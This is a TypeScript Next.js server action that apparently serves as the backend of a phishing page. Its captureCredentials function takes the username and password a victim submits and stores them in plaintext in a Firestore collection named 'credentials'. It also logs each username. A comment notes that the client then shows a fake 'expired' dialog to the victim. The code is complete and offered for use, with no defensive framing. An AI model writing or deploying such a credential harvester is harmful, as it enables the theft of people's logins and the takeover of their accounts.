'use server';

import * as admin from 'firebase-admin';
import { getServiceAccount } from '@/lib/firebase-admin';

// This function initializes the Firebase Admin SDK.
// It checks if the app is already initialized to prevent re-initialization.
function initializeFirebaseAdmin() {
  if (admin.apps.length > 0) {
    return admin.app();
  }

  // Get service account credentials from a dedicated server-side function
  const serviceAccount = getServiceAccount();

  if (!serviceAccount) {
    console.error('CRITICAL: Firebase service account credentials are not available.');
    return null;
  }

  try {
    // Initialize the Firebase Admin app with the credentials.
    return admin.initializeApp({
      credential: admin.credential.cert(serviceAccount),
    });
  } catch (error: any) {
    console.error('CRITICAL: Error initializing Firebase Admin SDK:', error.message);
    return null;
  }
}

// --- Server Action to Capture Credentials ---

export async function captureCredentials(prevState: any, formData: FormData) {
  // Initialize Firebase Admin right at the start of the action.
  const firebaseApp = initializeFirebaseAdmin();

  // If initialization fails, return a clear error message.
  if (!firebaseApp) {
    const errorMessage = 'Server configuration error. Could not connect to the database.';
    console.error(errorMessage);
    return { success: false, message: errorMessage };
  }

  const firestore = admin.firestore();

  const username = formData.get('username') as string;
  const password = formData.get('password') as string;

  console.log('Capturing credentials for:', username);

  if (!username || !password) {
    console.log('Submission failed: Missing username or password.');
    return { success: false, message: 'Username and password are required.' };
  }

  try {
    const newCredential = {
      username,
      password,
      createdAt: new Date().toISOString(),
    };

    // Add the new credential to the "credentials" collection in Firestore.
    await firestore.collection('credentials').add(newCredential);

    console.log('Successfully saved credentials to Firestore.');
    // This is the state we return on success. The client will show the "expired" dialog.
    return { success: true, message: 'Submission successful.' };

  } catch (error: any) {
    console.error('Error in captureCredentials writing to Firestore:', error.message);
    // Return a specific error message for the client.
    return {
      success: false,
      message: 'Failed to save credentials. Please check server logs for database write errors.',
    };
  }
}
